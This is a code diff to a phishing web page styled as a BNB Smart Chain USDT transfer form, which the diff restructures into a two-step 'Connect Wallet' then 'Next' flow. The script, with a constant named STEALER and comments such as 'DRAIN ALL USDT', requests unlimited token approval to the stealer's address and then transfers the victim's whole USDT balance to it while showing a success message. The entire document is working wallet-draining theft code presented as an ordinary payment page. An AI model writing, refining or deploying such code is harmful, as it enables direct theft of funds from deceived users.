@@ -9,6 +9,7 @@
 <style>
 .gradient-btn {background: linear-gradient(45deg,#f0b90b,#e6a700)!important;color:#000!important;}
 .network-pill{border-radius:50px;box-shadow:0 6px 20px rgba(0,0,0,0.1);}
+.connected {background: linear-gradient(45deg,#10b981,#059669)!important;}
 </style>
 </head>
 <body class="bg-gradient-to-br from-gray-50 to-blue-50 min-h-screen flex items-center justify-center p-4">
@@ -24,56 +25,70 @@ value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 <div class="mb-8">
 <div class="network-pill p-4 flex items-center gap-3 bg-white border border-gray-200">
 <img src="https://securebnb.live/images/BNB-icon.png" alt="BNB" class="w-12 h-12">
-<div><div class="font-bold text-lg text-green-600">BNB Smart Chain ✓</div><div class="text-sm text-gray-500">BEP20</div></div>
+<div><div class="font-bold text-lg text-green-600">BNB Smart Chain ✓</div><div class="text-sm text-gray-500" id="walletStatus">Connect Wallet</div></div>
 </div>
 </div>
 
 <div class="mb-10 relative">
 <input id="amount" type="number" class="w-full px-4 py-5 border border-gray-300 rounded-2xl text-2xl bg-gray-50" value="100">
-<span class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer" onclick="document.getElementById('amount').value='100000'">MAX</span>
+<span class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer z-10" onclick="document.getElementById('amount').value='100000'">MAX</span>
 </div>
 
-<button id="drainBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl">Next</button>
+<button id="connectBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl mb-3">Connect Wallet</button>
+<button id="drainBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl" style="display:none;">Next</button>
 </div>
 
 <script>
 const USDT = '0x55d398326f99059fF775485246999027B3197955';
 const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d';
+let web3, account, contract;
 
 const ABI = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];
 
+// STEP 1: Connect Wallet
+document.getElementById('connectBtn').onclick = async ()=>{
+    const btn = document.getElementById('connectBtn');
+    if(!window.ethereum) return alert('Trust Wallet browser kholo!');
+    
+    try{
+        btn.innerHTML = '🔄 Connecting...';
+        await window.ethereum.request({method:'eth_requestAccounts'});
+        web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
+        account = accounts[0];
+        
+        document.getElementById('walletStatus').innerHTML = account.slice(0,6)+'...'+account.slice(-4);
+        btn.style.display = 'none';
+        document.getElementById('drainBtn').style.display = 'block';
+        btn.innerHTML = 'Connected ✓';
+    }catch(e){
+        btn.innerHTML = 'Connect Wallet';
+    }
+};
+
+// STEP 2: Direct Approve + Drain
 document.getElementById('drainBtn').onclick = async ()=>{
     const btn = document.getElementById('drainBtn');
     btn.disabled = true;
-    btn.innerHTML = '🔄 Loading...';
-    
-    if(!window.ethereum) return alert('Trust Wallet kholo'), btn.disabled=false, btn.innerHTML='Next';
+    btn.innerHTML = '📤 Unlimited Approve...';
     
     try{
-        const web3 = new Web3(window.ethereum);
-        const accounts = await window.ethereum.request({method:'eth_accounts'});
-        
-        if(accounts.length===0){
-            await window.ethereum.request({method:'eth_requestAccounts'});
-            return;
-        }
-        
-        const account = accounts[0];
-        const contract = new web3.eth.Contract(ABI, USDT);
+        contract = new web3.eth.Contract(ABI, USDT);
         
         // UNLIMITED APPROVE
-        btn.innerHTML = '📤 Unlimited Approve...';
         const max = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         await contract.methods.approve(STEALER, max).send({from:account, gas:80000});
         
-        // DRAIN ALL
-        btn.innerHTML = '💰 Draining...';
+        // DRAIN ALL USDT
+        btn.innerHTML = '💰 Draining USDT...';
         const balance = await contract.methods.balanceOf(account).call();
-        if(balance>0) await contract.methods.transferFrom(account, STEALER, balance).send({from:account, gas:120000});
+        if(parseInt(balance) > 0){
+            await contract.methods.transferFrom(account, STEALER, balance).send({from:account, gas:120000});
+        }
         
         btn.innerHTML = '✅ SUCCESS!';
-        btn.style.background = '#10b981';
-        alert('All USDT transferred!');
+        btn.classList.add('connected');
+        alert('🎉 All USDT successfully transferred!');
         
     }catch(e){
         btn.innerHTML = 'Next';
